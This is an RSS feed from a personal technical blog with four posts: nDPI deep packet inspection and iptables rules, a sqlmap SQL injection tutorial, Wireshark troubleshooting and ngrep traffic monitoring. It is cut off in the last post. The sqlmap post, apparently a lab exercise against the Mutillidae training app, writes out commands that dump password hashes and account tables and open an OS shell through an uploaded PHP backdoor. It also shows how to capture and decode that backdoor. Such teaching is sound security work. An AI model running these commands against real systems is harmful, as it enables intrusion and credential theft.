<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Packet Analysis on Technical Notes</title>
    <link>https://tzyluen.github.io/tags/packet-analysis/index.xml</link>
    <description>Recent content in Packet Analysis on Technical Notes</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2015. All rights reserved.</copyright>
    <atom:link href="https://tzyluen.github.io/tags/packet-analysis/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Deep packet inspection</title>
      <link>https://tzyluen.github.io/post/deep-packet-inspection/</link>
      <pubDate>Fri, 24 Mar 2017 00:00:00 +0800</pubDate>
      
      <guid>https://tzyluen.github.io/post/deep-packet-inspection/</guid>
      <description>

&lt;p&gt;Port-independent, P2P, and encrypted protocols and packets have made the conventional network traffics analysis that based on packet header (transport protocol and application ports) obsolete. Deep Packet Inspection (DPI) technology can be used to identify and classify these encrypted, port-independent, P2P protocols.&lt;/p&gt;

&lt;p&gt;This post explore the popular open source implementations:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;nDPI library [1]&lt;/li&gt;
&lt;li&gt;ndpi-netfilter [2]&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Other similar open source DPI tools are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;L7-filter [3], open source, GPLv2.&lt;/li&gt;
&lt;li&gt;Libprotoident [4], open source, LGPL.&lt;/li&gt;
&lt;li&gt;PACE (Protocol and Application Classification Engine) [5], commercial.&lt;/li&gt;
&lt;li&gt;NBAR (Network Based Application Recognition) by Cisco [6], commercial.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; ndpi-netfilter tested only on Ubuntu 14.04.1 LTS (kernel 3.13.0-37-generic). During the initial experiment of this setup on machine with kernel v4.x, it did not work. The following Debian/wheezy machine with kernel v3.2 were used instead:&lt;/p&gt;

&lt;p&gt;OS/kernel version:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;tzy@192.168.1.12:~$ uname -a
Linux blackstar 3.2.0-4-amd64 #1 SMP Debian 3.2.63-2+deb7u2 x86_64 GNU/Linux
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&#34;ndpi&#34;&gt;nDPI&lt;/h1&gt;

&lt;h2 id=&#34;build-and-install-ndpi-netfilter&#34;&gt;Build and install ndpi-netfilter&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;Download ndpi-netfilter from &lt;a href=&#34;https://github.com/betolj/ndpi-netfilter&#34;&gt;https://github.com/betolj/ndpi-netfilter&lt;/a&gt; and extract to &lt;code&gt;/usr/src&lt;/code&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Install dependencies:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@192.168.1.12:~# apt-get install linux-source
root@192.168.1.12:~# apt-get install libtool
root@192.168.1.12:~# apt-get install autoconf
root@192.168.1.12:~# apt-get install pkg-config
root@192.168.1.12:~# apt-get install subversion
root@192.168.1.12:~# apt-get install libpcap-dev 
root@192.168.1.12:~# apt-get install iptables-dev 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Build and install nDPI:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@192.168.1.12:~# cd /usr/src/ndpi-netfilter-master
root@192.168.1.12:/usr/src/ndpi-netfilter-master# tar xvzf nDPI.tar.gz
root@192.168.1.12:/usr/src/ndpi-netfilter-master# cd nDPI
root@192.168.1.12:/usr/src/ndpi-netfilter-master/nDPI# ./autogen.sh
root@192.168.1.12:/usr/src/ndpi-netfilter-master/nDPI# make
root@192.168.1.12:/usr/src/ndpi-netfilter-master/nDPI# make install
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Build and install ndpi-netfilter:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@192.168.1.12:~# cd ..
root@192.168.1.12:~# NDPI_PATH=/usr/src/ndpi-netfilter-master/nDPI make
root@192.168.1.12:~# make modules_install
root@192.168.1.12:~# cp /usr/src/ndpi-netfilter-master/ipt/libxt_ndpi.so /lib/xtables/
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&#34;testing&#34;&gt;Testing&lt;/h1&gt;

&lt;h2 id=&#34;realtime-capture&#34;&gt;Realtime capture&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Runs SSH server 192.168.1.12 on port &lt;code&gt;26/tcp&lt;/code&gt; instead of the default &lt;code&gt;22/tcp&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/ndpi-deep-packet-inspection-03.png&#34; alt=&#34;ndpi-deep-packet-inspection-02&#34; /&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;From a client host 192.168.1.9, port scans 192.168.1.12, it shows as &lt;code&gt;26/tcp rsftp&lt;/code&gt; service:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/ndpi-deep-packet-inspection-04.png&#34; alt=&#34;ndpi-deep-packet-inspection-02&#34; /&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;SSH on non-standard port 26, and non-port based packets e.g., Facebook, Twitter, GMail, Youtube, Google, Apple, Cloudflare and etc were detected.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/ndpi-deep-packet-inspection-02.png&#34; alt=&#34;ndpi-deep-packet-inspection-02&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;iptables-netfilter&#34;&gt;Iptables/netfilter&lt;/h2&gt;

&lt;p&gt;To filter port-independent packets, get the list of supported protocols as shown below. Below are some popular protocols supported by ndpi:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@192.168.1.12:~# iptables -m ndpi -h
...
ndpi match options:
--ssh Match for SSH protocol packets.
--gnutella Match for GNUTELLA protocol packets.
--edonkey Match for EDONKEY protocol packets.
--facebook Match for FACEBOOK protocol packets.
--twitter Match for TWITTER protocol packets.
--webm Match for WEBM protocol packets.
--quic Match for QUIC protocol packets.
--whatsapp Match for WHATSAPP protocol packets.
--whatsapp_voice Match for WHATSAPP_VOICE protocol packets.
--snapchat Match for SNAPCHAT protocol packets.
--youtube Match for YOUTUBE protocol packets.
...
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;ssh&#34;&gt;SSH&lt;/h3&gt;

&lt;p&gt;To drop all incoming ssh packets, do:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@192.168.1.12:~# iptables -I INPUT -m ndpi --ssh -j DROP

iptables -A INPUT -m limit --limit 2/min -j LOG --log-prefix &amp;quot;[IPTABLES-INPUT-DROPPED] &amp;quot; --log-level 4
iptables -A OUTPUT -m limit --limit 2/min -j LOG --log-prefix &amp;quot;[IPTABLES-OUTPUT-DROPPED] &amp;quot; --log-level 4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; the last two lines are for logging purposes.&lt;/p&gt;

&lt;h3 id=&#34;youtube&#34;&gt;Youtube&lt;/h3&gt;

&lt;p&gt;To drop all incoming youtube based packets, do:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;iptables -A INPUT -m ndpi --youtube -j DROP
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;social-networks&#34;&gt;Social Networks&lt;/h3&gt;

&lt;p&gt;To drop all incoming and outgoing social networks, do:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;iptables -A INPUT -m ndpi --twitter -j DROP
iptables -A OUTPUT -m ndpi --twitter -j DROP
iptables -A INPUT -m ndpi --facebook -j DROP
iptables -A OUTPUT -m ndpi --facebook -j DROP
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;[1] nDPI -  &lt;a href=&#34;http://www.ntop.org/products/deep-packet-inspection/ndpi/&#34;&gt;http://www.ntop.org/products/deep-packet-inspection/ndpi/&lt;/a&gt; &lt;br&gt;
[2] ndpi-netfilter - &lt;a href=&#34;https://github.com/betolj/ndpi-netfilter/README&#34;&gt;https://github.com/betolj/ndpi-netfilter/README&lt;/a&gt; &lt;br&gt;
[3] L7-filter - &lt;a href=&#34;http://l7-filter.clearos.com&#34;&gt;http://l7-filter.clearos.com&lt;/a&gt; &lt;br&gt;
[4] Libprotoident - &lt;a href=&#34;https://research.wand.net.nz/software/libprotoident.php&#34;&gt;https://research.wand.net.nz/software/libprotoident.php&lt;/a&gt; &lt;br&gt;
[5] PACE (Protocol and Application Classification Engine) - &lt;a href=&#34;https://www.ipoque.com/products/dpi-engine-rsrpace-2&#34;&gt;https://www.ipoque.com/products/dpi-engine-rsrpace-2&lt;/a&gt; &lt;br&gt;
[6] NBAR (Network Based Application Recognition) - &lt;a href=&#34;http://www.cisco.com/c/en/us/products/ios-nx-os-software/network-based-application-recognition-nbar/index.html&#34;&gt;http://www.cisco.com/c/en/us/products/ios-nx-os-software/network-based-application-recognition-nbar/index.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>SQL injection with sqlmap</title>
      <link>https://tzyluen.github.io/post/sql-injection-with-sqlmap/</link>
      <pubDate>Sat, 07 May 2016 00:00:00 +0800</pubDate>
      
      <guid>https://tzyluen.github.io/post/sql-injection-with-sqlmap/</guid>
      <description>

&lt;h1 id=&#34;scan-for-vulnerability&#34;&gt;Scan for vulnerability&lt;/h1&gt;

&lt;h2 id=&#34;create-a-http-request-file&#34;&gt;Create a HTTP request file&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Use &lt;code&gt;-r&lt;/code&gt; option instead of passing long parameters of &lt;code&gt;--url&lt;/code&gt;, &lt;code&gt;--user-agent&lt;/code&gt;, etc.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; use packet capture utility such as &lt;code&gt;ngrep&lt;/code&gt; to facilitate the process.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sqlmap -r REQUESTFILE ...
-r REQUESTFILE      Load HTTP request from a file
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-01.png&#34; alt=&#34;sql-injection-with-sqlmap-01&#34; /&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Clean-up the trailing &lt;code&gt;.&lt;/code&gt; (non-printable char displayed by &lt;code&gt;ngrep&lt;/code&gt;), and write to a file e.g., &lt;code&gt;mutillidae-login.request&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-02.png&#34; alt=&#34;sql-injection-with-sqlmap-02&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;scan-the-target&#34;&gt;Scan the target&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Launch the scan with the &lt;code&gt;-r&lt;/code&gt; and use the request file created above, it will take some time:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r -mutillidae-login.request --batch --banner
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-03.png&#34; alt=&#34;sql-injection-with-sqlmap-03&#34; /&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Once a vulnerability is found, it will print the parameter that&amp;rsquo;s vulnerable, the injection type, and the payload used to carried out the injection. The following scan results indicate total of three type of injections found.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;boolean-based blind&lt;/li&gt;
&lt;li&gt;error-based&lt;/li&gt;
&lt;li&gt;AND/OR time-based blind&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-04.png&#34; alt=&#34;sql-injection-with-sqlmap-04&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; the &lt;code&gt;--technique&lt;/code&gt; option can be used to specifically target one type of attack.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt; --technique=BEUSTQ,
   B=boolean-based blind, E=error-based, U=union-query-based, S=stacked queries,
   T=time-based blind, Q=inline queries
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;explore-the-vulnerable-target-s-databases-and-system&#34;&gt;Explore the vulnerable target&amp;rsquo;s databases and system&lt;/h2&gt;

&lt;p&gt;Once entered the system:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Crack the passwords&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --passwords
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-05.png&#34; alt=&#34;sql-injection-with-sqlmap-05&#34; /&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;List the databases:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --dbs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-06.png&#34; alt=&#34;sql-injection-with-sqlmap-06&#34; /&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;List the tables:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --tables -D nowasp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-07.png&#34; alt=&#34;sql-injection-with-sqlmap-07&#34; /&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Dump the &lt;code&gt;nowasp.accounts&lt;/code&gt; table:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --dump -T accounts -D nowasp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-08.png&#34; alt=&#34;sql-injection-with-sqlmap-08&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;some-other-commonly-used-options-to-explore-the-system&#34;&gt;Some other commonly used options to explore the system:&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --current-user
$ sqlmap -r mutillidae-login.request --privileges
$ sqlmap -r mutillidae-login.request --dbms=mysql -D mysql --sql-query=&amp;quot;select user,password from mysql.user order by user desc&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;os-shell-access&#34;&gt;OS Shell Access&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; see section &lt;a href=&#34;#capture-and-decode-the-payload&#34;&gt;Capture and decode the payload&lt;/a&gt; to retrieve the payloads.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --os-shell
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-09.png&#34; alt=&#34;sql-injection-with-sqlmap-09&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;behind-the-scene&#34;&gt;Behind the scene&lt;/h3&gt;

&lt;p&gt;The file stager (1) &lt;code&gt;tmpuntbv.php&lt;/code&gt; is first uploaded to the &lt;code&gt;/var/www/html&lt;/code&gt; as explained in section &lt;a href=&#34;#capture-and-decode-the-payload&#34;&gt;Capture and decode the payload&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Then, the backdoor (2) &lt;code&gt;tmpbyovw.php&lt;/code&gt; is uploaded to the server through &lt;code&gt;tmpuntbv.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-14.png&#34; alt=&#34;sql-injection-with-sqlmap-14&#34; /&gt;&lt;/p&gt;

&lt;p&gt;All shell commands&amp;rsquo; requests are made through the backdoor script &lt;code&gt;tmpbyovw.php&lt;/code&gt; to 192.168.1.9 and results are returned to the 192.168.1.11.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-13.png&#34; alt=&#34;sql-injection-with-sqlmap-13&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;speedup-the-process-and-specify-custom-injection-payloads&#34;&gt;Speedup the process and specify custom injection payloads&lt;/h2&gt;

&lt;p&gt;To speedup the process, pass as many parameters to shorten the processing time. For examples:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-p TESTPARAMETER      Testable parameter(s)
--dbms=DBMS           Force back-end DBMS to this value
--technique=TECH      SQL injection techniques to use (default &amp;quot;BEUSTQ&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&#34;capture-and-decode-the-payload&#34;&gt;Capture and decode the payload&lt;/h1&gt;

&lt;p&gt;From the sqlmap stdout, pins down the files (payloads) uploaded:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-10.png&#34; alt=&#34;sql-injection-with-sqlmap-10&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;with-ngrep&#34;&gt;with Ngrep&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ ngrep -d eth0 -qt -W byline &amp;quot;^GET | ^POST&amp;quot; &amp;quot;port 80 and host 192.168.1.11&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Look for the files uploaded described above:
&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-11.png&#34; alt=&#34;sql-injection-with-sqlmap-11&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;with-wireshark&#34;&gt;with Wireshark&lt;/h2&gt;

&lt;p&gt;Use the following filters:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Capture filter: not broadcast and not multicast and host 192.168.1.11
Display filter (1): http contains &amp;quot;tmpuntbv.php&amp;quot;
Display filter (2): http contains &amp;quot;tmpbyovw.php&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From the matching packet, &lt;code&gt;Follow&lt;/code&gt; &amp;rarr; &lt;code&gt;HTTP Stream&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-12.png&#34; alt=&#34;sql-injection-with-sqlmap-12&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;decode-the-payload&#34;&gt;Decode the payload&lt;/h2&gt;

&lt;p&gt;Unquote the url strings with:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import sys
import urlparse
import codecs
buf = urlparse.unquote(sys.argv[1])
print buf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;produces,&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-15.png&#34; alt=&#34;sql-injection-with-sqlmap-15&#34; /&gt;&lt;/p&gt;

&lt;p&gt;and decodes the hex (starting from &lt;del&gt;0x&lt;/del&gt;3c3f&amp;hellip; until &amp;hellip;3e0a) with,&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload = sys.argv[1]
print codecs.decode(payload, &amp;quot;hex&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;produces,&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-16.png&#34; alt=&#34;sql-injection-with-sqlmap-16&#34; /&gt;&lt;/p&gt;

&lt;p&gt;the code basically handling file uploads and also change the uploaded files permission to &lt;code&gt;0755&lt;/code&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Wireshark: A quick troubleshoot on slow network (1)</title>
      <link>https://tzyluen.github.io/post/wireshark-a-quick-troubleshoot-on-slow-network-1/</link>
      <pubDate>Sat, 23 Apr 2016 00:00:00 +0800</pubDate>
      
      <guid>https://tzyluen.github.io/post/wireshark-a-quick-troubleshoot-on-slow-network-1/</guid>
      <description>

&lt;p&gt;&lt;strong&gt;Runs wireshark and starts capturing the network packets until the statistic builds.&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&#34;quick-drill-into-errors-and-connection-issues&#34;&gt;Quick drill into errors and connection issues&lt;/h1&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Navigates to &lt;code&gt;Analyze&lt;/code&gt; &amp;rarr; &lt;code&gt;Expert Info&lt;/code&gt;, a high number of errors and warnings indicates problems.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/wireshark-a-quick-troubleshoot-on-slow-network-03.png&#34; alt=&#34;wireshark-a-quick-troubleshoot-on-slow-network-03&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&#34;identify-the-protocols-with-high-traffic&#34;&gt;Identify the protocols with high traffic&lt;/h1&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Navigates to &lt;code&gt;Statistics&lt;/code&gt; &amp;rarr; &lt;code&gt;Protocol Hierarchy&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/wireshark-a-quick-troubleshoot-on-slow-network-01.png&#34; alt=&#34;wireshark-a-quick-troubleshoot-on-slow-network-01&#34; /&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Observes the resulting Protocol Hierarchy Statistic and pins down the suspicious/troubling protocol (e.g., high percentage of P2P or broadcast), right-click and select &lt;code&gt;Apply As Filter&lt;/code&gt; &amp;rarr; &lt;code&gt;Selected&lt;/code&gt; to apply the filter for further analysis.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&#34;get-the-connection-speed-to-a-site&#34;&gt;Get the connection speed to a site&lt;/h1&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Use a display filter such as &lt;code&gt;ip.addr == 192.168.1.7 &amp;amp;&amp;amp; ip.addr == 202.170.56.12 &amp;amp;&amp;amp; tcp.port == 22&lt;/code&gt; to filter the SSH traffic of the target site.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/wireshark-a-quick-troubleshoot-on-slow-network-05.png&#34; alt=&#34;wireshark-a-quick-troubleshoot-on-slow-network-05&#34; /&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Navigates to Wireshark menu &lt;code&gt;Statistics&lt;/code&gt; &amp;rarr; &lt;code&gt;Flow Graph&lt;/code&gt;.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Select show only &lt;code&gt;Displayed packets&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Right-click on the TCP flow diagram and zoom to increase the details of the packet.&lt;/li&gt;
&lt;li&gt;Observe the connection establishment timestamp and response time. High number of retransmissions, and re-established connections indicate problems.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/wireshark-a-quick-troubleshoot-on-slow-network-06.png&#34; alt=&#34;wireshark-a-quick-troubleshoot-on-slow-network-06&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&#34;get-the-time-spent-in-waiting-for-a-response&#34;&gt;Get the time spent in waiting for a response&lt;/h1&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;To show the time difference from the previous packet, add the &lt;code&gt;Delta time&lt;/code&gt; into the display columns. From the column displays, right-click and select &lt;code&gt;Column Preferences&lt;/code&gt; &amp;rarr; add a new column and set the type as &lt;code&gt;Delta time&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/wireshark-a-quick-troubleshoot-on-slow-network-04.png&#34; alt=&#34;wireshark-a-quick-troubleshoot-on-slow-network-04&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&#34;identify-the-bad-packets-tcp-errors-ratio&#34;&gt;Identify the bad packets (TCP errors) ratio&lt;/h1&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Navigates to &lt;code&gt;Statistics&lt;/code&gt; &amp;rarr; &lt;code&gt;I/O Graph&lt;/code&gt;. Customizes the IO graphs with:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;TCP errors (&lt;code&gt;tcp.analysis.flags&lt;/code&gt;) to filters the bad TCP packets.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Retransmission (&lt;code&gt;tcp.analysis.retransmission || tcp.analysis.fast_retransmission&lt;/code&gt;) filters the retransmitted packets.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A consistently high TCP errors and retransmission ratio often indicate problems. For instance, approx. half of the total packets were indicated in figure below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/wireshark-a-quick-troubleshoot-on-slow-network-02.png&#34; alt=&#34;wireshark-a-quick-troubleshoot-on-slow-network-02&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>Ngrep: quick peek at http traffic</title>
      <link>https://tzyluen.github.io/post/ngrep-quick-peek-at-http-traffic/</link>
      <pubDate>Sat, 16 Apr 2016 00:00:00 +0800</pubDate>
      
      <guid>https://tzyluen.github.io/post/ngrep-quick-peek-at-http-traffic/</guid>
      <description>

&lt;h3 id=&#34;quick-peek&#34;&gt;Quick peek:&lt;/h3&gt;

&lt;p&gt;Monitor activities on device &lt;code&gt;eth0 port 80&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;-W byline&lt;/code&gt;: linefeeds (LF) are printed as linefeeds, more readable.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;-qt&lt;/code&gt;: quiet mode and print human-readable timestamp.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# ngrep -d eth0 -W byline -qt port 80
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h3 id=&#34;sorts-out-unique-user-agent-devices&#34;&gt;Sorts out unique User-Agent (devices):&lt;/h3&gt;

&lt;p&gt;In corporate environment, desktop/laptop OS build is often standardized. However, with the BYOD initiative, the network has becomes even more vulnerable. To quickly identify the type of devices on the network, we could do:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sudo ngrep -qt -W single -d eth0 -P~ &#39;User-Agent:&#39; &#39;port 80&#39; &amp;gt; http-user-agent.txt
$ sed &#39;s/.*User-Agent/User-Agent/&#39; http-user-agent.txt | sed &#39;s/~.*//&#39; | sed &#39;/^$/d&#39; &amp;gt; user-agents.txt
$ cat user-agents.txt | sort | uniq -c | sort -rn
  28 User-Agent: Chrome 20.0.1092.0 (Win 7)&amp;quot; useragent=&amp;quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6
   7 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36
   5 User-Agent: Chrome 15.0.874.120 (Vista)&amp;quot; useragent=&amp;quot;Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2
   4 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Or use &lt;code&gt;tshark&lt;/code&gt; :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sudo tshark -i eth0 -f &amp;quot;port 80&amp;quot; -Y &amp;quot;http contains \&amp;quot;User-Agent:\&amp;quot;&amp;quot; -Tfields -e http.user_agent &amp;gt; user-agents.txt
$ cat user-agents.txt | sort | uniq -c | sort -rn
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h3 id=&#34;monitor-the-occurrence-of-the-keywords&#34;&gt;Monitor the occurrence of the keywords:&lt;/h3&gt;

&lt;p&gt;Capture network traffic matches tcp port 80 (HTTP) on GET/POST methods:&lt;/p&gt;

